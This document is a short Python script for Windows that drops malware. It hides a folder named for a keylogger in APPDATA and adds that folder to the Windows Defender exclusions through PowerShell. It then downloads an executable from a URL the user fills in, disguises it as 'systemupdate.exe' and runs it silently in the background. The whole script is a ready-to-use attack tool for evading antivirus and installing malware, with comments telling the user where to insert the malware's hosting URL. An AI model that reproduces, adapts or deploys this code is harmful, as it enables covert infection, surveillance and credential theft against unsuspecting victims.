import os
import subprocess
import requests




# Step 1: Create a hidden folder
folder_name = "Keylogger_Hide"
folder_path = os.path.join(os.getenv('APPDATA'), folder_name)

try:
    os.makedirs(folder_path, exist_ok=True)
    # Make the folder hidden and system-protected
    subprocess.run(['attrib', '+H', '+S', folder_path], check=True)
    print("Folder created at:", folder_path)
except Exception as e:
    print(f"Error creating folder: {e}")
    exit()

# Step 2: Add folder to Windows Defender exclusion (using HKCU)
defender_exclude_script = f"""
$folderPath = "{folder_path}"
Add-MpPreference -ExclusionPath "{folder_path}"
"""

try:
    subprocess.run(['powershell', '-Command', defender_exclude_script], check=True)
except Exception as e:
    print(f"Error adding to Defender exclusions: {e}")
    exit()

# Step 3: Download the malware into the hidden folder (malware is renamed as a systemupdate.exe)
malware_url = "https://your-url/systemupdate.exe"  #Add the URL that malware is hosted on.



malware_path = os.path.join(folder_path, "systemupdate.exe")

try:
    subprocess.run(['curl', '-L', '-o', malware_path, malware_url], check=True)
    print("Malware downloaded successfully.")
except Exception as e:
    print(f"Error downloading malware: {e}")
    exit()

# Step 4: Run the malware silently
try:
    subprocess.Popen([malware_path], creationflags=subprocess.CREATE_NO_WINDOW)
    print("Malware is now running in the background.")
except Exception as e:
    print(f"Error running malware: {e}")
    exit()

print("Setup complete. Malware is hidden and running.")